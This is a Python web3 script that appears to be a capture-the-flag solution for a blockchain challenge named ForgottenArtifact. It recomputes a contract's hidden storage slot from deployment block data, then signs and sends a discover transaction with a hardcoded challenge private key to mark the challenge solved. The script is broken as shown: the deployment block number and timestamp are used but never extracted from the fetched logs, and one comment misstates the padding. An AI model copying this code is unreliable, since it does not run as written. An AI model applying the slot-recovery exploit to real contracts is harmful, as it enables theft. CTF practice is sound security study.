from web3 import Web3
from eth_utils import keccak

# Blockchain connection details
rpc_url = "http://94.237.60.227:54032/"
web3 = Web3(Web3.HTTPProvider(rpc_url))

if not web3.is_connected():
    print("Failed to connect to blockchain. Exiting...")
    exit()
print("Connected to blockchain")

# Player credentials
private_key = "7359da6d170f24a70c1267e7523618e67f4bbdb388da25ea4dd55eb4833a5f6e"
player_address = "0xB1D806180B9464B103859dBf117418fdDB9C859e"

# Contract addresses
setup_address = "0xa02F314439ADDEd46aCced7861baC40e6f9B6fFc"
target_address = "0x4aef35172A3B80f902adB4AF19eD9F2282199F5A"

# -----------------------------------------------------------------------
# Find the block and timestamp at which the ForgottenArtifact (TARGET) was deployed
# -----------------------------------------------------------------------
event_signature = "DeployedTarget(address)"
event_topic = "0x" + keccak(text=event_signature).hex()

logs = web3.eth.get_logs({
    "address": setup_address,
    "fromBlock": 0,
    "toBlock": "latest",
    "topics": [event_topic]
})

if len(logs) == 0:
    print("Could not find deployment log for target. Can't proceed.")
    exit()


print(f"Deployment block: {deployment_block_number}")
print(f"Deployment timestamp: {deployment_block_timestamp}")

# Compute artifact_location as in constructor:
artifact_location = keccak(
    deployment_block_number.to_bytes(32, 'big') +
    deployment_block_timestamp.to_bytes(32, 'big') +
    bytes.fromhex(setup_address[2:])
)

print(f"Computed Artifact Location: {artifact_location.hex()}")

# Debugging: Check the storage at computed artifact_location
try:
    artifact_slot = web3.eth.get_storage_at(target_address, artifact_location)
    print("Artifact Slot Content:", artifact_slot.hex())
except Exception as e:
    print("Error reading storage slot:", e)

# -----------------------------------------------------------------------
# Interact with the contract: call discover(artifact_location)
# -----------------------------------------------------------------------
try:
    nonce = web3.eth.get_transaction_count(player_address)

    # Manually construct the transaction data
    function_selector = keccak(text="discover(bytes32)")[:4]
    encoded_params = artifact_location.rjust(32, b'\x00')  # Right-pad to 32 bytes
    tx_data = function_selector + encoded_params

    tx = {
        "from": player_address,
        "to": target_address,
        "gas": 200000,
        "gasPrice": web3.to_wei("50", "gwei"),
        "nonce": nonce,
        "data": tx_data.hex()
    }

    # Sign the transaction
    signed_tx = web3.eth.account.sign_transaction(tx, private_key=private_key)

    # Use the correct attribute for raw transaction
    if hasattr(signed_tx, "rawTransaction"):
        raw_tx = signed_tx.rawTransaction
    elif hasattr(signed_tx, "raw_transaction"):
        raw_tx = signed_tx.raw_transaction
    else:
        raise AttributeError("No valid raw transaction attribute found in SignedTransaction object.")

    # Send the raw transaction
    tx_hash = web3.eth.send_raw_transaction(raw_tx)
    print(f"Transaction sent! TX Hash: {web3.to_hex(tx_hash)}")

    # Wait for transaction receipt
    receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    print("Transaction mined!")
except Exception as e:
    print(f"Error interacting with the contract: {e}")
    exit()

# -----------------------------------------------------------------------
# Check if the challenge is solved
# -----------------------------------------------------------------------
try:
    setup_abi = [
        {
            "inputs": [],
            "name": "isSolved",
            "outputs": [{"name": "", "type": "bool"}],
            "stateMutability": "view",
            "type": "function"
        }
    ]
    setup_contract = web3.eth.contract(address=setup_address, abi=setup_abi)
    solved = setup_contract.functions.isSolved().call()
    if solved:
        print("Challenge Solved!")
        print("Now you can get the flag by connecting to the instance manager via:")
        print("nc 94.237.60.227 32796")
        print("Then select action '3 - Get flag'")
    else:
        print("Challenge not yet solved. Check your exploit.")
except Exception as e:
    print(f"Error checking solution: {e}")
